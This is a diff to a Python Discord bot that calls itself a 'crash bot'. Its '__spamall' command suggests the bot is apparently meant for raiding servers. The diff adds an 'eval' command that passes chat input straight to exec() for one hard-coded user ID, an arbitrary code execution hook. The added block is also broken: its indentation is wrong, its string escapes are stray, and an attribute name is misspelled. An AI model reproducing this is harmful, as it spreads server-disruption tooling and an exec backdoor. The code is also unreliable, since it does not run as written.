@@ -3,6 +3,8 @@ import datetime
 import random
 import asyncio
 import dhooks
+import contextlib
+import io
 
 from discord.ext import commands
 from config import settings
@@ -160,6 +162,19 @@ async def webhtest(ctx):
 	servername = ctx.gulid.name
 	emb = webhook.Embed(title = 'Тестовое сообщение', description = f"123 {servername} a", color = 0xe01337)
 	webhook.send(embed = emb, username = 'Краш-бот')
+
+@client.command()
+async def eval(ctx, *, code):
+	if ctx.author.id == 610453921726595082:
+		str_obj = io.StringIO() #Retrieves a stream of data
+			try:
+				with contextlib.redirect_stdout(str_obj):
+					exec(code)
+			except Exception as e:
+				return await ctx.send(f"```{e.__class__.__name__}: {e}```")
+			await ctx.send(f'```py\n\{str_obj.getvalue()}\n\```')
+	else:
+		await ctx.send('Нельзя :)')
 
 @client.command(aliases=['spamall'])
 async def __spamall(ctx):
